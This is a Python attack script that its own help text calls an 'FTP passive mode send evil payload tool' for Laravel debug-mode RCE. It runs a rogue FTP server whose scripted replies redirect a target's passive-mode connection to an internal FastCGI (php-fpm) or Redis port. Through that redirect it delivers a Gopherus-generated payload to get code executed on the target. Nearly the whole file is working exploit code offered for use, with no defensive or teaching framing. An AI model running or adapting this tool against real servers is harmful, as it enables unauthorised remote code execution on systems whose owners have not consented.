#coding:utf-8
import socket
from thread import *
import time
import sys
sys.path.insert(0,'./scripts/')
from scripts import FastCGI,Redis
import urllib
import argparse
import random
__author__ = u'水泡泡'

def new_conn(host,payload):
    data = urllib.unquote(payload)
    sk1 = socket.socket()
    sk1.bind((host, 8744))
    sk1.listen(1)
    conn1, address1 = sk1.accept()
    conn1.send(data)
    conn1.close()
    sk1.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='FTP passive mode send evil payload tool, can use in laravel debug mode rce.')
    parser.add_argument('--host',  type=str,default='127.0.0.1', help='ftp listen host (default 127.0.0.1)')
    parser.add_argument('--port',  type=int, default='2323', help='ftp listen port (default 2323)')
    parser.add_argument('--toaddress',  type=str, default='127.0.0.1', help='to address (default 127.0.0.1)')
    parser.add_argument('--toport',  type=int, default=9000, help='to port (default 9000)')
    parser.add_argument('--exploit',  type=str, default='fastcgi', help="fastcgi,redis (default fastcgi)")
    args = parser.parse_args()
    try:
        host = args.host
        port = args.port
        toaddress = args.toaddress
        toport = args.toport
        exploit = args.exploit

        print('\033[96m[+]\033[0mChoose your command powered by gopherus')
        if(exploit=="fastcgi"):
            payload =FastCGI.FastCGI()
        elif(exploit=="redis"):
            payload = Redis.Redis()

        print('\033[96m[+]\033[0mStart evil ftp server in %s:%s'%(host,port))
        print('\033[96m[+]\033[0mSend payload to %s:%s'%(toaddress,toport))
        start_new_thread(new_conn,(host,payload,))
        sk = socket.socket()
        sk.bind((host, port))
        sk.listen(5)

        conn, address = sk.accept()
    
        conn.send("200 \n")
        print('\033[96m[+]\033[0mStage1: Sending payload to the target')

    
        conn.recv(20)
        conn.send("200 \n")

        
        conn.recv(20)
        conn.send("200 \n")
        print('>> Type')

    
        conn.recv(20)
        conn.send("213 \n")
        print('>> SIZE')

        conn.recv(20)
        print('>> Eps')
        conn.send("200 \n")

        conn.recv(20)
        conn.send("227 %s,7,6952\n"%(host.replace('.',',')))
        print('>> Pas')

        conn.recv(20)
        print('>> Retr')
        conn.send('125 \n')
        time.sleep(1)
        conn.send('226 \n')

        conn.recv(20)
        conn.send('200 \n')
        print('>> Byte')

        print('\033[96m[+]\033[0mStage2: Sending evil port to the fpm')
        conn, address = sk.accept()
        conn.send("200 \n")

        conn.recv(20)
        conn.send("200 \n")

        conn.recv(20)
        conn.send("200 \n")
        print('>> Type')

        conn.recv(20)
        conn.send("300 \n")
        print('>> Size')

        conn.recv(20)
        conn.send("200 \n")
        print('>> Eps')

        conn.recv(20)
        
        portprefix = random.randint(5,20)
        portsuffix = toport - portprefix*256
        conn.send("227 %s,%d,%d\n"%(toaddress.replace('.',','), portprefix, portsuffix))
        print('>> Pas')

        conn.recv(20)
        conn.send("150 \n")
        print('>> Store')

        conn.close()
        exit()
    except:
        exit()